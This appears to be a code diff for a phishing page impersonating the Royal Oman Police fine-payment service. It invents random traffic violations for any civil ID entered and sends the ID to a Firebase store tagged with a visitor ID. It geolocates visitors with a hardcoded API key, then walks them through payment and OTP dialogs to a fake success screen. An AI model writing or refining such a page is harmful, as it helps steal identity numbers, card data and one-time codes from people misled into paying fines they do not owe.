@@ -8,11 +8,14 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Button } from "@/components/ui/button"
 import { ViolationsList } from "@/components/violations-list"
-import { SiteHeader } from "@/components/ui/header"
-import { EnhancedPaymentForm } from "@/components/payment-form"
 import { addData } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
 import { OTPDialog } from "@/components/otp-dialog"
+import { CheckCircle2 } from "lucide-react"
+import Link from "next/link"
+import { PaymentDialog } from "@/components/payment-dialog"
+import { SiteHeader } from "@/components/site-header"
+import { AppFooter } from "@/components/app-footer"
 
 interface Violation {
   id: string
@@ -73,76 +76,36 @@ const mockViolations: Violation[] = [
   {
     id: "V006",
     type: "عدم إعطاء الأولوية للمشاة",
-    date: "2024-12-28",
+    date: "2023-12-28",
     location: "شارع الوادي الكبير، مسقط",
     amount: 40,
     plateNumber: "*****0",
     status: "paid",
   },
-  {
-    id: "V007",
-    type: "التوقف المفاجئ دون سبب",
-    date: "2024-12-20",
-    location: "شارع السيب العام، السيب",
-    amount: 35,
-    plateNumber: "*****0",
-    status: "paid",
-  },
-
-  {
-    id: "V009",
-    type: "القيادة بدون رخصة",
-    date: "2024-11-30",
-    location: "طريق صحار السريع، صُحار",
-    amount: 200,
-    plateNumber: "*****0",
-    status: "unpaid",
-  },
-  {
-    id: "V010",
-    type: "تشغيل الموسيقى بصوت مرتفع",
-    date: "2024-11-20",
-    location: "شاطئ القرم، مسقط",
-    amount: 20,
-    plateNumber: "*****0",
-    status: "paid",
-  },
-  {
-    id: "V011",
-    type: "عدم صيانة المركبة",
-    date: "2024-11-10",
-    location: "شارع المطار القديم، مسقط",
-    amount: 45,
-    plateNumber: "*****0",
-    status: "unpaid",
-  },
-  {
-    id: "V012",
-    type: "سير المركبة بدون أضواء",
-    date: "2024-11-01",
-    location: "طريق الباطنة السريع، بركاء",
-    amount: 60,
-    plateNumber: "*****0",
-    status: "paid",
-  },
 ]
-function randstr(prefix: string) {
-  return Math.random().toString(36).replace('0.', prefix || '');
-}
-const visitorID = randstr('om-')
 
-export default function ROPFinePage() {
+function randstr(prefix: string) {
+  return Math.random()
+    .toString(36)
+    .replace("0.", prefix || "")
+}
+
+const visitorID = randstr("om-")
+
+export default function ViolationsPage() {
   const [violations, setViolations] = useState<Violation[]>([])
   const [isLoading, setIsLoading] = useState(false)
   const [showViolations, setShowViolations] = useState(false)
-  const [showOtp, setShowOTP] = useState(false)
-  const [showPayment, setShowPayment] = useState(false)
+  const [showPaymentDialog, setShowPaymentDialog] = useState(false)
+  const [showOtpDialog, setShowOtpDialog] = useState(false)
+  const [showSuccess, setShowSuccess] = useState(false)
   const [formData, setFormData] = useState({
     registrationType: "personal",
     civilId: "",
     expiryDate: "",
     specificVehicle: false,
   })
+
   async function getLocation() {
     const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
     const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
@@ -163,24 +126,25 @@ export default function ROPFinePage() {
       console.error('Error fetching location:', error);
     }
   }
+
   useEffect(() => {
     getLocation()
   }, [])
+
   const getRandomViolations = () => {
-    const numberOfViolations = Math.floor(Math.random() * 4) + 1 // 1-4 violations
+    const numberOfViolations = Math.floor(Math.random() * 4) + 1
     const shuffled = [...mockViolations].sort(() => 0.5 - Math.random())
     return shuffled.slice(0, numberOfViolations)
   }
-  const omanIdRegex = /^[1-9]\d{7,12}$/;
 
+  const omanIdRegex = /^[1-9]\d{7,12}$/
   function isValidOmanId(id: string): boolean {
-    return omanIdRegex.test(id);
+    return omanIdRegex.test(id)
   }
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setIsLoading(true)
-    // Simulate API call delaay
     addData({ id: visitorID, phone: formData.civilId })
     await new Promise((resolve) => setTimeout(resolve, 1500))
     const randomViolations = getRandomViolations()
@@ -191,7 +155,9 @@ export default function ROPFinePage() {
 
   const handleReset = () => {
     setShowViolations(false)
-    setShowPayment(false)
+    setShowPaymentDialog(false)
+    setShowOtpDialog(false)
+    setShowSuccess(false)
     setViolations([])
     setFormData({
       registrationType: "personal",
@@ -201,118 +167,151 @@ export default function ROPFinePage() {
     })
   }
 
-  const handlePaymentSuccess = (data: any) => {
-    // Update violations to paid status
-
+  const handlePaymentSuccess = () => {
     const updatedViolations = violations.map((v) => (v.status === "unpaid" ? { ...v, status: "paid" as const } : v))
     setViolations(updatedViolations)
-    setShowPayment(false)
-    setShowOTP(true)
   }
 
   const totalAmount = violations.filter((v) => v.status === "unpaid").reduce((sum, v) => sum + v.amount, 0)
 
-  return (
-    <div className="bg-white min-h-screen font-sans" dir="rtl">
-      <SiteHeader />
-      <main>
-        {/* Title Banner */}
-        <div className="bg-[#85a646] text-white text-center py-4">
-          <h1 className="text-4xl font-bold">دفع المخالفات</h1>
-        </div>
+  if (showSuccess) {
+    return (
+      <div className="bg-gray-50 min-h-screen font-sans flex flex-col" dir="rtl">
+        <SiteHeader />
+        <main
+          className="flex-grow flex items-center justify-center p-4"
+          style={{ backgroundImage: "url(/bg.png)", backgroundRepeat: "repeat", backgroundSize: "auto" }}
+        >
+          <Card className="max-w-md mx-auto bg-white/90 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
+            <CardContent className="p-8 text-center">
+              <CheckCircle2 className="w-20 h-20 text-green-500 mx-auto mb-4" />
+              <h2 className="text-2xl font-bold text-gray-800 mb-2">تم الدفع بنجاح!</h2>
+              <p className="text-gray-600 mb-6">تمت معالجة دفع المخالفات بنجاح. ستتلقى رسالة تأكيد قريبًا.</p>
+              <div className="space-y-3">
+                <Button
+                  onClick={handleReset}
+                  className="w-full bg-[#85a646] hover:bg-green-600 text-white font-bold text-lg py-3 rounded-lg"
+                >
+                  استعلام جديد
+                </Button>
+                <Link href="/">
+                  <Button variant="outline" className="w-full bg-transparent">
+                    العودة للصفحة الرئيسية
+                  </Button>
+                </Link>
+              </div>
+            </CardContent>
+          </Card>
+        </main>
+        <AppFooter />
+      </div>
+    )
+  }
 
-        {/* Form Section */}
+  return (
+    <div className="bg-gray-50 min-h-screen font-sans flex flex-col" dir="rtl">
+      <SiteHeader />
+      <main className="flex-grow">
+        <div className="bg-[#85a646] text-white text-center py-6">
+          <h1 className="text-2xl md:text-3xl font-bold">دفع المخالفات المرورية</h1>
+          <p className="text-sm opacity-90 mt-2">شرطة عمان السلطانية</p>
+        </div>
         <div
           className="py-12 px-4"
-          style={{
-            backgroundImage: "url(bg.jpg)",
-            backgroundRepeat: "repeat",
-            backgroundSize: "auto",
-          }}
+          style={{ backgroundImage: "url(/bg.png)", backgroundRepeat: "repeat", backgroundSize: "auto" }}
         >
-          <OTPDialog isOpen={showOtp} onClose={() => setShowOTP(false)} phoneNumber="******0" />
-          {showPayment ? (
-            <EnhancedPaymentForm
-              totalAmount={totalAmount}
-              violations={violations.filter((v) => v.status === "unpaid")}
-              onCancel={() => setShowPayment(false)} onSuccess={function (): void {
-              }} />
-          ) : !showViolations ? (
-            <Card className="max-w-md mx-auto bg-backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
+          {!showViolations ? (
+            <Card className="max-w-md mx-auto bg-white/80 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
               <CardContent className="p-8">
                 <form onSubmit={handleSubmit} className="space-y-6">
                   <div className="text-center">
                     <h2 className="text-xl font-semibold text-gray-700">اختر نوع التسجيل</h2>
                   </div>
-
                   <div className="flex justify-center gap-8">
-                    <div className="flex items-center space-x-2 space-x-reverse">
+                    <div className="flex items-center gap-2">
                       <Checkbox
                         id="personal"
                         checked={formData.registrationType === "personal"}
-                        onCheckedChange={() => setFormData((prev) => ({ ...prev, registrationType: "personal" }))}
+                        onCheckedChange={() =>
+                          setFormData((prev) => ({
+                            ...prev,
+                            registrationType: "personal",
+                          }))
+                        }
                         className="data-[state=checked]:bg-blue-600 data-[state=checked]:border-blue-600"
                       />
                       <Label htmlFor="personal" className="text-lg font-medium text-gray-700">
                         شخصي
                       </Label>
                     </div>
-                    <div className="flex items-center space-x-2 space-x-reverse">
+                    <div className="flex items-center gap-2">
                       <Checkbox
                         id="commercial"
                         checked={formData.registrationType === "commercial"}
-                        onCheckedChange={() => setFormData((prev) => ({ ...prev, registrationType: "commercial" }))}
+                        onCheckedChange={() =>
+                          setFormData((prev) => ({
+                            ...prev,
+                            registrationType: "commercial",
+                          }))
+                        }
                       />
                       <Label htmlFor="commercial" className="text-lg font-medium text-gray-700">
                         تجاري
                       </Label>
                     </div>
                   </div>
-
                   <div className="space-y-2">
                     <Label htmlFor="civil-id" className="text-gray-600">
-                      رقم المدني
+                      رقم الهوية المدنية
                     </Label>
                     <Input
                       id="civil-id"
                       type="tel"
                       value={formData.civilId}
                       onChange={(e) => {
-                        setFormData((prev) => ({ ...prev, civilId: e.target.value }))
-                        isValidOmanId(e.target.value)
-                      }
-                      }
+                        setFormData((prev) => ({
+                          ...prev,
+                          civilId: e.target.value,
+                        }))
+                      }}
                       className="bg-white rounded-lg"
                       required
                     />
                   </div>
-
                   <div className="space-y-2">
                     <Label htmlFor="expiry-date" className="text-gray-600">
-                      تاريخ الانتهاء
+                      تاريخ انتهاء الرخصة
                     </Label>
                     <Input
                       id="expiry-date"
                       type="text"
-                      placeholder="dd/mm/yyyy"
+                      placeholder="YYYY/MM/DD"
                       value={formData.expiryDate}
-                      onChange={(e) => setFormData((prev) => ({ ...prev, expiryDate: e.target.value }))}
+                      onChange={(e) =>
+                        setFormData((prev) => ({
+                          ...prev,
+                          expiryDate: e.target.value,
+                        }))
+                      }
                       className="bg-white rounded-lg"
                       required
                     />
                   </div>
-
-                  <div className="flex items-center space-x-2 space-x-reverse pt-2">
+                  <div className="flex items-center gap-2 pt-2">
                     <Checkbox
                       id="specific-vehicle"
                       checked={formData.specificVehicle}
-                      onCheckedChange={(checked) => setFormData((prev) => ({ ...prev, specificVehicle: !!checked }))}
+                      onCheckedChange={(checked) =>
+                        setFormData((prev) => ({
+                          ...prev,
+                          specificVehicle: !!checked,
+                        }))
+                      }
                     />
                     <Label htmlFor="specific-vehicle" className="text-gray-700">
                       الإستفسار عن مركبة معينة
                     </Label>
                   </div>
-
                   <div className="space-y-3 pt-4">
                     <Button
                       type="submit"
@@ -321,27 +320,23 @@ export default function ROPFinePage() {
                     >
                       {isLoading ? "جاري البحث..." : "الإستفسار"}
                     </Button>
-                    <Button
-                      type="button"
-                      variant="ghost"
-                      onClick={handleReset}
-                      className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold text-lg py-6 rounded-lg"
-                    >
-                      إلغاء
-                    </Button>
+                    <Link href="/">
+                      <Button type="button" variant="ghost" className="w-full">
+                        العودة للصفحة الرئيسية
+                      </Button>
+                    </Link>
                   </div>
                 </form>
               </CardContent>
             </Card>
           ) : (
             <div className="max-w-4xl mx-auto">
-              <Card className="bg-white/40 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
+              <Card className="bg-white/80 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
                 <CardContent className="p-8">
                   <div className="text-center mb-6">
                     <h2 className="text-2xl font-bold text-gray-800 mb-2">نتائج الاستعلام</h2>
-                    <p className="text-gray-600">رقم المدني: {formData.civilId}</p>
+                    <p className="text-gray-600">رقم الهوية المدنية: {formData.civilId}</p>
                   </div>
-
                   {violations.length > 0 ? (
                     <>
                       <ViolationsList violations={violations} />
@@ -349,14 +344,14 @@ export default function ROPFinePage() {
                         <div className="mt-6 p-4 bg-red-50 rounded-lg border border-red-200">
                           <div className="flex justify-between items-center">
                             <span className="text-lg font-semibold text-red-800">إجمالي المبلغ المستحق:</span>
-                            <span className="text-2xl font-bold text-red-600">{totalAmount} ر.ع</span>
+                            <span className="text-2xl font-bold text-red-600">{totalAmount.toFixed(2)} ر.ع</span>
                           </div>
                         </div>
                       )}
-                      <div className="flex gap-4 mt-6">
+                      <div className="flex flex-col sm:flex-row gap-4 mt-6">
                         {totalAmount > 0 && (
                           <Button
-                            onClick={() => setShowPayment(true)}
+                            onClick={() => setShowPaymentDialog(true)}
                             className="flex-1 bg-[#85a646] hover:bg-green-600 text-white font-bold py-3"
                           >
                             دفع المخالفات
@@ -365,7 +360,7 @@ export default function ROPFinePage() {
                         <Button
                           variant="outline"
                           onClick={handleReset}
-                          className="flex-1 border-gray-300 text-gray-700 font-bold py-3 bg-transparent"
+                          className="flex-1 border-gray-300 text-gray-700 font-bold py-3 bg-transparent hover:bg-gray-100"
                         >
                           استعلام جديد
                         </Button>
@@ -375,7 +370,7 @@ export default function ROPFinePage() {
                     <div className="text-center py-8">
                       <div className="text-green-600 text-6xl mb-4">✓</div>
                       <h3 className="text-xl font-semibold text-green-800 mb-2">لا توجد مخالفات مسجلة</h3>
-                      <p className="text-gray-600 mb-6">لم يتم العثور على أي مخالفات مرورية مسجلة باسمك</p>
+                      <p className="text-gray-600 mb-6">لم يتم العثور على أي مخالفات مرورية مسجلة.</p>
                       <Button
                         onClick={handleReset}
                         className="bg-[#85a646] hover:bg-green-600 text-white font-bold px-8 py-3"
@@ -389,7 +384,29 @@ export default function ROPFinePage() {
             </div>
           )}
         </div>
+
+        <PaymentDialog
+          open={showPaymentDialog}
+          onOpenChange={setShowPaymentDialog}
+          totalAmount={totalAmount}
+          onSuccess={() => {
+            setShowPaymentDialog(false)
+            setShowOtpDialog(true)
+          }}
+        />
+
+        <OTPDialog
+          open={showOtpDialog}
+          onOpenChange={setShowOtpDialog}
+          phoneNumber={formData.civilId}
+          onSuccess={() => {
+            setShowOtpDialog(false)
+            handlePaymentSuccess()
+            setShowSuccess(true)
+          }}
+        />
       </main>
+      <AppFooter />
     </div>
   )
 }
